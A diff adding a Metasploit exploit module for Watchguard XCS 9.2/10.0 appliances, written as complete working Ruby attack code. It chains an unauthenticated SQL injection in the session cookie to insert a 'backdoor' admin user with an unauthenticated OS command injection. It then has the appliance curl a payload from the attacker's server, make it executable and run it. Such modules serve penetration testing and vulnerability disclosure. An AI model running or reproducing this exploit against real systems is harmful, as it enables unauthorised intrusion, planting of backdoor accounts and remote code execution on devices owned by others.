@@ -1,0 +1,280 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Watchguard XCS Remote Command Execution',
+      'Description'    => %q{
+        This module exploits two separate vulnerabilities found in the Watchguard XCS virtual
+        appliance to gain command execution. By exploiting an unauthenticated SQL injection, a
+        remote attacker may insert a valid web user into the appliance database, and get access
+        to the web interface. On the other hand, a vulnerability in the web interface allows the
+        attacker to inject operating system commands as the 'nobody' user.
+      },
+      'Author'         =>
+        [
+          'Daniel Jensen <daniel.jensen[at]security-assessment.com>' # discovery and Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf']
+        ],
+      'Platform'       => 'bsd',
+      'Arch'           => ARCH_X86_64,
+      'Privileged'     => false,
+      'Stance'         => Msf::Exploit::Stance::Aggressive,
+      'Targets'        =>
+        [
+          [ 'Watchguard XCS 9.2/10.0', { }]
+        ],
+      'DefaultOptions' =>
+        {
+          'SSL' => true
+        },
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jun 29 2015'
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The target URI', '/']),
+        OptString.new('WATCHGUARD_USER', [true, 'Web interface user account to add', 'backdoor']),
+        OptString.new('WATCHGUARD_PASSWORD', [true, 'Web interface user password', 'backdoor']),
+        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10]),
+        Opt::RPORT(443)
+      ],
+      self.class
+    )
+  end
+
+  def check
+    #Check to see if the SQLi is present
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),
+      'cookie' => "sid=1'"
+     })
+
+     if res && res.body && res.body.include?('unterminated quoted string')
+       return Exploit::CheckCode::Vulnerable
+     end
+
+     Exploit::CheckCode::Safe
+  end
+
+
+  def exploit
+    # Get a valid session by logging in or exploiting SQLi to add user
+    print_status('Getting a valid session...')
+    @sid = get_session
+    print_status('Successfully logged in')
+
+    # Check if cmd injection works
+    test_cmd_inj = send_cmd_exec('/ADMIN/mailqueue.spl', 'id')
+    unless test_cmd_inj && test_cmd_inj.body.include?('uid=65534')
+      fail_with(Failure::UnexpectedReply, 'Could not inject command, may not be vulnerable')
+    end
+
+    # We have cmd exec, stand up an HTTP server and deliver the payload
+    vprint_status('Getting ready to drop binary on appliance')
+
+    @elf_sent = false
+    # Generate payload
+    @pl = generate_payload_exe
+
+    if @pl.nil?
+      fail_with(Failure::BadConfig, 'Please select a native bsd payload')
+    end
+
+    # Start the server and use primer to trigger fetching and running of the payload
+    begin
+      Timeout.timeout(datastore['HTTPDELAY']) { super }
+    rescue Timeout::Error
+    end
+  end
+
+  def attempt_login(username, pwd_clear)
+    #Attempts to login with the provided user credentials
+    #Get the login page
+    get_login_hash = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '/login.spl')
+    })
+
+    unless get_login_hash && get_login_hash.body
+      fail_with(Failure::Unreachable, 'Could not get login page.')
+    end
+
+    #Find the hash token needed to login
+    login_hash = ''
+    get_login_hash.body.each_line do |line|
+      next if line !~ /name="hash" value="(.*)"/
+      login_hash = $1
+      break
+    end
+
+    sid_cookie = (get_login_hash.get_cookies || '').scan(/sid=(\w+);/).flatten[0] || ''
+    if login_hash == '' || sid_cookie == ''
+      fail_with(Failure::UnexpectedReply, 'Could not find login hash or cookie')
+    end
+
+    login_post = {
+      'u' => "#{username}",
+      'pwd' => "#{pwd_clear}",
+      'hash' => login_hash,
+      'login' => 'Login'
+    }
+    print_status('Attempting to login with provided credentials')
+    login = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '/login.spl'),
+      'method' => 'POST',
+      'encode_params' => false,
+      'cookie' => "sid=#{sid_cookie}",
+      'vars_post' => login_post,
+      'vars_get' => {
+        'f' => 'V'
+      }
+    })
+
+
+    unless login && login.body && login.body.include?('<title>Loading...</title>')
+      return nil
+    end
+
+    sid_cookie
+  end
+
+  def add_user(user_id, username, pwd_hash, pwd_clear)
+    #Adds a user to the database using the unauthed SQLi
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),
+      'cookie' => "sid=1%3BINSERT INTO sds_users (self, login, password, org, priv_level, quota, disk_usage) VALUES(#{user_id}, '#{username}', '#{pwd_hash}', 0, 'server_admin', 0, 0)--"
+    })
+
+    unless res && res.body
+      fail_with(Failure::Unreachable, "Could not connect to host")
+    end
+
+    if res.body.include?('ERROR:  duplicate key value violates unique constraint')
+      print_status("Added backdoor user, credentials => #{username}:#{pwd_clear}")
+    else
+      fail_with(Failure::UnexpectedReply, 'Unable to add user to database')
+    end
+
+    true
+  end
+
+  def generate_device_hash(cleartext_password)
+    #Generates the specific hashes needed for the XCS
+    pre_salt = 'BorderWare '
+    post_salt = ' some other random (9) stuff'
+    hash_tmp = Rex::Text.md5(pre_salt + cleartext_password + post_salt)
+    final_hash = Rex::Text.md5(cleartext_password + hash_tmp)
+
+    final_hash
+  end
+
+  def send_cmd_exec(uri, os_cmd, blocking = true)
+    #This is a handler function that makes HTTP calls to exploit the command injection issue
+    unless @sid
+      fail_with(Failure::Unknown, 'Missing a session cookie when attempting to execute command.')
+    end
+
+    opts = {
+      'uri' => normalize_uri(target_uri.path, "#{uri}"),
+      'cookie' => "sid=#{@sid}",
+      'encode_params' => true,
+      'vars_get' => {
+        'f' => 'dnld',
+        'id' => ";#{os_cmd}"
+      }
+    }
+
+    if blocking
+      res = send_request_cgi(opts)
+    else
+      res = send_request_cgi(opts, 1)
+    end
+
+    #Handle cmd exec failures
+    if res.nil? && blocking
+      fail_with(Failure::Unknown, 'Failed to exploit command injection.')
+    end
+
+    res
+  end
+
+  def get_session
+    #Gets a valid login session, either valid creds or the SQLi vulnerability
+    username = datastore['WATCHGUARD_USER']
+    pwd_clear = datastore['WATCHGUARD_PASSWORD']
+    user_id = rand(999)
+
+    sid_cookie = attempt_login(username, pwd_clear)
+
+    return sid_cookie unless sid_cookie.nil?
+
+    vprint_error('Failed to login, attempting to add backdoor user...')
+    pwd_hash = generate_device_hash(pwd_clear)
+
+    unless add_user(user_id, username, pwd_hash, pwd_clear)
+      fail_with(Failure::Unknown, 'Failed to add user account to database.')
+    end
+
+    sid_cookie = attempt_login(username, pwd_clear)
+
+    unless sid_cookie
+      fail_with(Failure::Unknown, 'Unable to login with user account.')
+    end
+
+    sid_cookie
+  end
+
+  # Make the server download the payload and run it
+  def primer
+    vprint_status('Primer hook called, make the server get and run exploit')
+
+    #Gets the autogenerated uri from the mixin
+    payload_uri = get_uri
+
+    filename = rand_text_alpha_lower(8)
+    print_status("Sending download request for #{payload_uri}")
+
+    download_cmd = "/usr/local/sbin/curl -k #{payload_uri} -o /tmp/#{filename}"
+    vprint_status("Telling appliance to run #{download_cmd}")
+    send_cmd_exec('/ADMIN/mailqueue.spl', download_cmd)
+    register_file_for_cleanup("/tmp/#{filename}")
+
+    chmod_cmd = "chmod +x /tmp/#{filename}"
+    vprint_status('Chmoding the payload...')
+    send_cmd_exec("/ADMIN/mailqueue.spl", chmod_cmd)
+
+    exec_cmd = "/tmp/#{filename}"
+    vprint_status('Running the payload...')
+    send_cmd_exec('/ADMIN/mailqueue.spl', exec_cmd, false)
+
+    vprint_status('Finished primer hook, raising Timeout::Error manually')
+    raise(Timeout::Error)
+  end
+
+  #Handle incoming requests from the server
+  def on_request_uri(cli, request)
+    vprint_status("on_request_uri called: #{request.inspect}")
+    print_status('Sending the payload to the server...')
+    @elf_sent = true
+    send_response(cli, @pl)
+  end
+
+end
